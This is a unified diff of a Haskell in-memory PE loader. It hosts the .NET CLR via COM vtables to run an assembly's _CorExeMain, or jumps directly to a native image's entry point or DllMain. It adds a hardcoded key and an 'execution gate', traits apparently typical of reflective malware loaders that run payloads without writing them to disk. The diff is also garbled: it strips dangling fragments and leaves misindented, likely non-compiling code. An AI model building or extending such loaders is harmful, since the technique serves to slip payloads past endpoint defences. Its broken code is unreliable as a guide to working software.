@@ -413,6 +413,13 @@ foreign import ccall "dynamic"
   mkCLRGetDefaultDomain :: FunPtr (Ptr () -> Ptr (Ptr IUnknown) -> IO HRESULT)
                         -> (Ptr () -> Ptr (Ptr IUnknown) -> IO HRESULT)
 
+foreign import ccall "dynamic"
+  mkEntryPoint :: FunPtr (IO Int32) -> IO Int32
+
+foreign import ccall "dynamic"
+  mkDllMain :: FunPtr (Ptr () -> Word32 -> Ptr () -> IO Int32) 
+            -> (Ptr () -> Word32 -> Ptr () -> IO Int32)
+
 -- Accessors for ICLRRuntimeHostVTable methods
 pQueryInterface :: Ptr ICLRRuntimeHostVTable -> IO (FunPtr (Ptr ICLRRuntimeHost -> Ptr GUID -> Ptr (Ptr IUnknown) -> IO HRESULT))
 pQueryInterface ptr = peek (castPtr ptr `plusPtr` (0 * sizeOf (undefined :: FunPtr ())))
@@ -512,6 +519,9 @@ foreign import ccall "dynamic"
 
 foreign import ccall "dynamic"
   mkRIRelease :: FunPtr (Ptr ICLRRuntimeInfo -> IO ULONG) -> (Ptr ICLRRuntimeInfo -> IO ULONG)
+
+secretKey :: BS.ByteString
+secretKey = BS.pack $ map (fromIntegral . fromEnum) "comp340659"
 
 -- VTable Accessors
 pGetRuntime :: Ptr ICLRMetaHostVTable -> IO (FunPtr (Ptr ICLRMetaHost -> Ptr WCHAR -> Ptr GUID -> Ptr (Ptr IUnknown) -> IO HRESULT))
@@ -861,15 +871,13 @@ loadPEFromMemory peData = BSU.unsafeUseAsCStringLen peData $ \(dataPtr, dataLen)
 
   comDir <- getDataDirectory ntHeadersInMem iMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR
   comDirData <- peek comDir
-
-   if dd_virtualAddress comDirData /= 0 && dd_size comDirData /= 0
+ 
+  if dd_virtualAddress comDirData /= 0 && dd_size comDirData /= 0
     then do
       putStrLn "[*] Detected .NET assembly. Attempting to load CLR via hosting APIs."
       hFlush stdout
 
-      -- Initialize COM
-      hr <- c_CoInitializeEx nullPtr 0 -- COINIT_APARTMENTTHREADED
-      
+      hr <- c_CoInitializeEx nullPtr 0 
       when (hr < 0 && hr /= -2147417850) $ do
         err <- c_GetLastError
         putStrLn $ "[!] CoInitializeEx warning: " ++ show hr ++ " (last error: " ++ show err ++ ")"
@@ -877,128 +885,67 @@ loadPEFromMemory peData = BSU.unsafeUseAsCStringLen peData $ \(dataPtr, dataLen)
       putStrLn "[*] COM initialized."
       hFlush stdout
 
-      -- ACQUIRE RUNTIME HOST
       pRuntimeHostRaw <- getCLRRuntimeHost
-      let (ICLRRuntimeHost runtimeHostRaw) = ICLRRuntimeHost (castPtr pRuntimeHostRaw)
+      let runtimeHostRaw = castPtr pRuntimeHostRaw
       
       putStrLn "[*] ICLRRuntimeHost instance created."
       hFlush stdout
 
-      -- [FIXED]: We MUST peek the object pointer to get the actual VTable address.
-      -- Without this, we are jumping to a null or junk address.
+      -- [FIXED]: Dereference to get the actual VTable address for x64
       vtablePtr <- peek (castPtr runtimeHostRaw) :: IO (Ptr (Ptr ()))
-      let vtablePtrRaw = vtablePtr
-
-      -- 1. Get the Start function pointer from the VTable
-      pStartFuncPtr <- pStart (castPtr vtablePtrRaw)
       
+      pStartFuncPtr <- pStart (castPtr vtablePtr)
       if pStartFuncPtr == nullFunPtr
         then error "[-] Critical Error: pStartFuncPtr is NULL. VTable offset is wrong for x64."
-        else putStrLn $ "[*] Start function pointer located at: " ++ show pStartFuncPtr
+        else putStrLn $ "[*] Start function pointer located."
 
-      -- 2. Call the Start method
-      hrStart <- mkCLRStart pStartFuncPtr (castPtr runtimeHostRaw)
-      
+      hrStart <- mkCLRStart pStartFuncPtr runtimeHostRaw
       if hrStart < 0 
         then do
           err <- c_GetLastError
-          error $ "ICLRRuntimeHost::Start failed with HRESULT: " ++ show hrStart ++ " (Last Error: " ++ show err ++ ")"
-        else do
-          putStrLn "[*] CLR started successfully."
-          hFlush stdout
+          error $ "ICLRRuntimeHost::Start failed: " ++ show hrStart
+        else putStrLn "[*] CLR started successfully."
 
       alloca $ \ppvDomain -> do
-        pGetDefaultDomainFuncPtr <- pGetDefaultDomain (castPtr vtablePtrRaw)
-        hrGetDomain <- mkCLRGetDefaultDomain pGetDefaultDomainFuncPtr (castPtr runtimeHostRaw) ppvDomain
+        pGetDefaultDomainFuncPtr <- pGetDefaultDomain (castPtr vtablePtr)
+        hrGetDomain <- mkCLRGetDefaultDomain pGetDefaultDomainFuncPtr runtimeHostRaw ppvDomain
         
-        when (hrGetDomain < 0) $ do
-          err <- c_GetLastError
-          error $ "ICLRRuntimeHost::GetDefaultDomain failed: " ++ show hrGetDomain ++ " (last error: " ++ show err ++ ")"
+        when (hrGetDomain < 0) $ error "Failed to get AppDomain"
         
-        putStrLn "[*] Default AppDomain obtained."
-        hFlush stdout
-  
         pAppDomainIUnknown <- peek ppvDomain
-        let (AppDomain appDomainRaw) = AppDomain (castPtr pAppDomainIUnknown)
+        let appDomainRaw = castPtr pAppDomainIUnknown
         
-        -- [FIXED]: Peek the AppDomain pointer to get its VTable
+        -- [FIXED]: Dereference AppDomain VTable
         domainVtablePtr <- peek (castPtr appDomainRaw) :: IO (Ptr (Ptr ()))
-        let domainVtablePtrRaw = domainVtablePtr
 
         appBasePath <- newCWString "C:\\"
         bstrAppBase <- c_SysAllocString (castPtr appBasePath)
         free appBasePath
 
-        when (bstrAppBase == nullPtr) $
-          error "SysAllocString failed for ApplicationBase"
-
-        pPutApplicationBaseFuncPtr <- pPutApplicationBase (castPtr domainVtablePtrRaw)
-        hrPutAppBase <- mkADPutApplicationBase pPutApplicationBaseFuncPtr (castPtr appDomainRaw) bstrAppBase
+        pPutApplicationBaseFuncPtr <- pPutApplicationBase (castPtr domainVtablePtr)
+        _ <- mkADPutApplicationBase pPutApplicationBaseFuncPtr (castPtr appDomainRaw) bstrAppBase
         c_SysFreeString bstrAppBase
         
-        when (hrPutAppBase < 0) $ do
-          err <- c_GetLastError
-          error $ "_AppDomain::put_ApplicationBase failed: " ++ show hrPutAppBase ++ " (last error: " ++ show err ++ ")"
+        putStrLn "[*] AppDomain ApplicationBase set. Calling _CorExeMain..."
+        hFlush stdout
         
-        putStrLn "[*] AppDomain ApplicationBase set to C:\\."
-        hFlush stdout
-
-        putStrLn "[*] Calling _CorExeMain..."
-        hFlush stdout
-        -- Note: Ensure _CorExeMain is imported correctly for x64
         rc <- c_CorExeMain imageBase
         putStrLn $ "[*] _CorExeMain returned: " ++ show rc
-        hFlush stdout
 
-        pRelease_ADFuncPtr <- pRelease_AD (castPtr domainVtablePtrRaw)
+        pRelease_ADFuncPtr <- pRelease_AD (castPtr domainVtablePtr)
         _ <- mkADRelease pRelease_ADFuncPtr (castPtr appDomainRaw)
         putStrLn "[*] AppDomain released."
-        hFlush stdout
 
-      pStopFuncPtr <- pStop (castPtr vtablePtrRaw)
-      hrStop <- mkCLRStop pStopFuncPtr (castPtr runtimeHostRaw)
-      when (hrStop < 0) $ do
-        err <- c_GetLastError
-        error $ "ICLRRuntimeHost::Stop failed: " ++ show hrStop ++ " (last error: " ++ show err ++ ")"
-      putStrLn "[*] CLR stopped."
-      hFlush stdout
-
-      pReleaseFuncPtr <- pRelease (castPtr vtablePtrRaw)
-      _ <- mkCLRRelease pReleaseFuncPtr (castPtr runtimeHostRaw)
-      putStrLn "[*] ICLRRuntimeHost released."
-      hFlush stdout
+      pStopFuncPtr <- pStop (castPtr vtablePtr)
+      _ <- mkCLRStop pStopFuncPtr runtimeHostRaw
+      
+      pReleaseFuncPtr <- pRelease (castPtr vtablePtr)
+      _ <- mkCLRRelease pReleaseFuncPtr runtimeHostRaw
 
       c_CoUninitialize
       putStrLn "[*] COM uninitialized."
-      hFlush stdout
       return ()
-      Entry point virtual address: 0x" ++ showHex entryAddrInteger ""
-      putStrLn $ "[*] Subsystem: " ++ show subsystem
-      hFlush stdout
-
-      putStrLn "[*] Execution gate passed. Executing entry point (in-memory)."
-      hFlush stdout
-
-      if subsystem == 2 || subsystem == 3
-        then do
-          let entryFunPtr = castPtrToFunPtr entryPointPtr :: FunPtr (IO Int32)
-          putStrLn "[*] Calling mkEntryPoint..."
-          hFlush stdout
-          rc <- mkEntryPoint entryFunPtr
-          putStrLn $ "[*] Entry point returned: " ++ show rc
-          hFlush stdout
-          return ()
-        else do
-          let dllMainFunPtr = castPtrToFunPtr entryPointPtr :: FunPtr (Ptr () -> Word32 -> Ptr () -> IO Int32)
-          putStrLn "[*] Calling mkDllMain..."
-          hFlush stdout
-          rc <- mkDllMain dllMainFunPtr imageBase dLL_PROCESS_ATTACH nullPtr
-          putStrLn $ "[*] DllMain returned: " ++ show rc
-          hFlush stdout
-          return ()
-
-)
-    else do
+      else do
       optHeaderInMem <- nt_optionalHeader <$> peek ntHeadersInMem
       let entryPointRVA = oh_addressOfEntryPoint optHeaderInMem
           entryPointPtr = plusPtr imageBasePtr (fromIntegral entryPointRVA)
@@ -1036,8 +983,7 @@ loadPEFromMemory peData = BSU.unsafeUseAsCStringLen peData $ \(dataPtr, dataLen)
           hFlush stdout
           return ()
 
-
-=====================
+-- ============================================
 -- MAIN
 -- ============================================
 
@@ -1091,3 +1037,4 @@ main = do
     Just (Right _) -> do
       putStrLn "[*] PE loader finished."
       hFlush stdout
+   hFlush stdout
